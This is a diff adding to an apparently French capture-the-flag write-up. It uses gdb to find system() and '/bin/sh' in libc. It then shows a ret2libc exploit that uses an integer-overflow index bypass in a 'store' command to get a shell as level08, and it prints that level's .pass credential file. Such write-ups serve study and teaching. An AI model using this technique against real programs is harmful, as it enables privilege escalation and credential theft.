@@ -40,6 +40,41 @@ Pour contourner ca on fait 114 + 2^31 = 2147483762
 
 le contournement n'est pas necessaire pour 115 et 116
 
+```shell
+(gdb) b main
+(gdb) run
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) info proc mappings
+...
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+...
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh" 
+0xf7f897ec
+1 pattern found.
+```
+system address : 4159090384 -> 0xf7e6aed0
+"/bin/sh" address : 4160264172 -> 0xf7f897ec
+
+```shell
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 1234
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami  
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
 
 ## Reverse engineering
 
